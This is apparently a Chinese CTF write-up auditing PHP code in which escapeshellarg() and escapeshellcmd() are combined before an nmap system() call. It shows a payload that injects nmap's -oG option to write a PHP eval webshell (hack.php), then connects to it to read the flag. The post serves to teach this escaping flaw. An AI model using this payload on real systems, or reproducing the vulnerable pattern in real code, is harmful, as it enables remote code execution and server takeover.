```
##### 0x01分析题目

拿到 题目是一道代码审计的题目，直接开始分析代码。

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

先看第一个if，这里是要求remote_addr和http_x_forwarded_for相同，但是没有什么实际作用，因为就算不同也没有else， 影响不大。

![复制代码](https://common.cnblogs.com/images/copycode.gif)

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}

![复制代码](https://common.cnblogs.com/images/copycode.gif)

再来看第二个if块代码，首先是要修必须以get的方式传入一个host参数。如果没有传如参数，高亮显示代码；传入参数后，保存在变量$host中。

变量$host先经过两个函数的处理，然后会将$host的值放入system中执行。这中间呢，创建了一个目录，并且通过chdir()使得system的命令执行也在创建的这个目录。

##### 0x02命令执行

escapeshellarg()函数，在linux系统下，会将单引号转义成 '\'' ，用单引号将字符串括起来。

escapeshellcmd()函数，在linux系统下，会将未配对的单引号等特殊符号进行转义。

这样当这两个函数混合在一起使用时，就会导致，转义的单引被绕过。

题目中给出的是nmap命令，拼接上我们可控的参数$host，那么就可以通过添加nmap参数执行将命令和结果写入文件的操作，写入一句话木马。

nmap写入文件的参数是 -oG

那么对应的payload

![复制代码](https://common.cnblogs.com/images/copycode.gif)

?host = ' <?php @eval($_POST["hack"]);?> -oG hack.php '

经过两个函数处理后 ' '\\''\<\?php @eval\(\$_POST\["hack"\]\)\;\?\>  -oG hack.php '\\'''

实际执行的nmap命令，那么将会在创建的目录下生成一个hack.php，一句话写入成功

nmap -T5 -sT -Pn --host-timeout 2 -F  ' '\\''\<\?php @eval\(\$_POST\["hack"\]\)\;\?\>  -oG hack.php '\\'''

![复制代码](https://common.cnblogs.com/images/copycode.gif)

生成的一句话木马在通过md5加密后mkdir下面

通过蚁剑连接生成的一句话木马，在根目录下找到flag

这道题呢，主要就是考察了escapeshellarg()函数和escapeshellcmd()这两个函数混用产生的安全隐患。

以及对nmap指令参数的了解

你还年轻，可以成为你想成为的任何人。
```